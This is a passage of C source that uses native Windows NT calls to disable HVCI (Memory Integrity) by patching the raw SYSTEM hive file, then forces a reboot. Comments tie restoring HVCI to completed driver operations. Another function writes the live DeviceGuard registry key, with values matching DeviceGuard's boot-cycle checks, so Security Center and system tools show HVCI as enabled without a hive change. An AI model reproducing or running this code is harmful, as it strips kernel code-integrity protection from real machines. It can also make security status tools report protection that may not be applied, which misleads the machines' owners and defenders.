                    writeOffset.QuadPart = vkFileOffset + 12; // Inline REG_DWORD payload.

                    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb,
                                         &newValue, sizeof(newValue),
                                         &writeOffset, NULL);

                    if (NT_SUCCESS(status)) {
                        verifyOffset.QuadPart = vkFileOffset + 12;
                        status = NtReadFile(hFile, NULL, NULL, NULL, &verifyIosb,
                                            &verifiedValue, sizeof(verifiedValue),
                                            &verifyOffset, NULL);

                        if (NT_SUCCESS(status) &&
                            verifyIosb.Information == sizeof(verifiedValue) &&
                            verifiedValue == newValue) {
                            patchCount++;
                            DEBUG_LOG(L"DEBUG: HVCI VK patched via ValuesListOffset\r\n");
                        } else {
                            DEBUG_LOG(L"DEBUG: HVCI VK write verification failed\r\n");
                        }
                    }
                }

                break;
            }

            if (!foundEnabled) {
                DEBUG_LOG(L"DEBUG: HVCI key found but Enabled value not resolved\r\n");
            }
            
            // Continue searching within this chunk (handle multiple instances)
            searchStart = patternOffset + 31;
        }

        // Prepare for next chunk
        if (bytesRead < SCAN_CHUNK_SIZE) {
            break; // EOF reached
        }

        // Overlap adjustment: rewind file pointer by OVERLAP_SIZE
        currentPos += (bytesRead - OVERLAP_SIZE);
        fileOffset.QuadPart = currentPos;
    }

    // Finalization
    if (patchCount > 0) {
        DisplayMessage(L"SUCCESS: HVCI hive patched\r\n");
        
        // Flush buffers to physical media
        NtFlushBuffersFile(hFile, &iosb);
        NtClose(hFile);
        
        return TRUE; 
    }

    // Normal closure if no changes made
    NtClose(hFile);

    if (skipCount > 0) {
        DEBUG_LOG(enable ? L"INFO: HVCI already enabled.\r\n"
                         : L"INFO: HVCI already disabled.\r\n");
        return TRUE;
    }

    DisplayMessage(L"FAILED: Pattern not found (Chunked Scan)\r\n");
    return FALSE;
}

// ============================================================================
// MAIN HVCI CONTROL LOGIC
// ============================================================================

// Reads the live DeviceGuard registry key to determine whether HVCI is active.
// If Enabled==1: patches the SYSTEM hive, then triggers a reboot.
// Returns TRUE if a reboot was initiated (caller must terminate).
BOOLEAN CheckAndDisableHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    UCHAR buffer[256];
    ULONG resultLength;
    PKEY_VALUE_PARTIAL_INFORMATION kvpi;
    ULONG currentValue;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_READ, &oa);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    RtlInitUnicodeString(&usValueName, L"Enabled");
    memset_impl(buffer, 0, sizeof(buffer));

    status = NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation,
                            buffer, sizeof(buffer), &resultLength);

    NtClose(hKey);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;

    if (kvpi->Type != REG_DWORD || kvpi->DataLength != sizeof(ULONG)) {
        return FALSE;
    }

    currentValue = *(ULONG*)kvpi->Data;

    if (currentValue == 1) {
        DisplayMessage(L"INFO: HVCI (Memory Integrity) is enabled\r\n");
        DisplayMessage(L"INFO: Disabling HVCI via SYSTEM hive patch...\r\n");

        DEBUG_LOG(L"DEBUG: About to call PatchSystemHiveHVCI(FALSE)...\r\n");

        BOOLEAN patchResult = PatchSystemHiveHVCI(FALSE);

        DEBUG_LOG(L"DEBUG: PatchSystemHiveHVCI returned\r\n");

        if (!patchResult) {
            DisplayMessage(L"FAILED: Cannot patch SYSTEM hive\r\n");
            return FALSE;
        }

        DisplayMessage(L"SUCCESS: HVCI disabled in SYSTEM hive for next boot\r\n");
        DisplayMessage(L"INFO: Current registry value can still show the old state until reboot\r\n");
        DisplayMessage(L"INFO: Initiating system reboot...\r\n");

        status = NtShutdownSystem(1);

        if (!NT_SUCCESS(status)) {
            DisplayMessage(L"WARNING: Automatic reboot failed, reboot manually to apply HVCI change\r\n");
            DisplayStatus(status);
            return TRUE;
        }

        DisplayMessage(L"INFO: Waiting for system restart...\r\n");
        
        // Replace busy-wait with proper termination
        // System will reboot anyway, terminate process gracefully
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
        return TRUE;
    }

    return FALSE;
}

// Patches the SYSTEM hive to re-enable HVCI (Enabled=1) for the next boot.
// Called after all driver operations complete when RestoreHVCI=YES.
NTSTATUS RestoreHVCI(void) {
    DisplayMessage(L"INFO: Re-enabling HVCI for next boot...\r\n");

    if (!PatchSystemHiveHVCI(TRUE)) {
        DisplayMessage(L"WARNING: Cannot restore HVCI in SYSTEM hive\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    DisplayMessage(L"SUCCESS: HVCI will be re-enabled on next boot\r\n");
    return STATUS_SUCCESS;
}

// Returns KeBootTime as a FILETIME (UTC, 100-ns ticks) via
// NtQuerySystemInformation(SystemTimeOfDayInformation=3).
// SYSTEM_TIMEOFDAY_INFORMATION layout: BootTime(8), CurrentTime(8), TimeZoneBias(8), ...
//
// NOTE: this is NOT equivalent to Win32_OperatingSystem.LastBootUpTime — that value
// is recomputed on demand as (CurrentTime - GetTickCount64()) and drifts on Hyper-V
// after VMICTimeSync applies a step correction.  KeBootTime is written once during
// kernel Phase0 and never changes, which is exactly what DeviceGuard uses for
// ChangedInBootCycle validation.
static NTSTATUS GetBootTimeUtc(ULONGLONG* outBootTime) {
    // ULONGLONG[] gives 8-byte alignment — buf[0] == BootTime with no cast or copy.
    // 6 elements * 8 bytes = 48, matches SYSTEM_TIMEOFDAY_INFORMATION exactly.
    ULONGLONG buf[6];
    ULONG retLen = 0;
    NTSTATUS status;

    status = NtQuerySystemInformation(3 /*SystemTimeOfDayInformation*/,
                                      buf, sizeof(buf), &retLen);
    if (!NT_SUCCESS(status)) return status;
    if (retLen < 8) return STATUS_BUFFER_TOO_SMALL;

    *outBootTime = buf[0];  // BootTime at offset 0
    return STATUS_SUCCESS;
}

// Updates the volatile (live) DeviceGuard registry key — does NOT write the
// physical hive.  Effect is immediate; Security Center and system tools pick
// it up without a reboot.
//
// When enable=TRUE, also writes:
//   WasEnabledBy       (REG_DWORD) = 2  — "enabled by user/policy"
//   ChangedInBootCycle (REG_QWORD)      — KeBootTime from GetBootTimeUtc(),
//                                         matching what DeviceGuard reads for
//                                         boot-cycle validation
NTSTATUS SetHVCIRegistryFlag(BOOLEAN enable) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG value = enable ? 1 : 0;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) return status;

    // 1. Enabled (REG_DWORD)
    RtlInitUnicodeString(&usValueName, L"Enabled");
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &value, sizeof(ULONG));
    if (!NT_SUCCESS(status)) { NtClose(hKey); return status; }

    if (enable) {
        // 2. WasEnabledBy = 2 (REG_DWORD)
        ULONG wasEnabledBy = 2;
        RtlInitUnicodeString(&usValueName, L"WasEnabledBy");
        status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD,
                               &wasEnabledBy, sizeof(ULONG));
        if (!NT_SUCCESS(status)) { NtClose(hKey); return status; }

        // 3. ChangedInBootCycle (REG_QWORD) = boot FILETIME UTC
        ULONGLONG bootTime = 0;
        if (NT_SUCCESS(GetBootTimeUtc(&bootTime)) && bootTime != 0) {
            RtlInitUnicodeString(&usValueName, L"ChangedInBootCycle");
            status = NtSetValueKey(hKey, &usValueName, 0, REG_QWORD,
                                   &bootTime, sizeof(ULONGLONG));
            if (!NT_SUCCESS(status)) {
                DEBUG_LOG(L"WARNING: ChangedInBootCycle write failed\r\n");
                status = STATUS_SUCCESS;
            }
        } else {
            DEBUG_LOG(L"WARNING: Could not read BootTime, ChangedInBootCycle skipped\r\n");
        }
    }

    NtClose(hKey);
    return STATUS_SUCCESS;
}
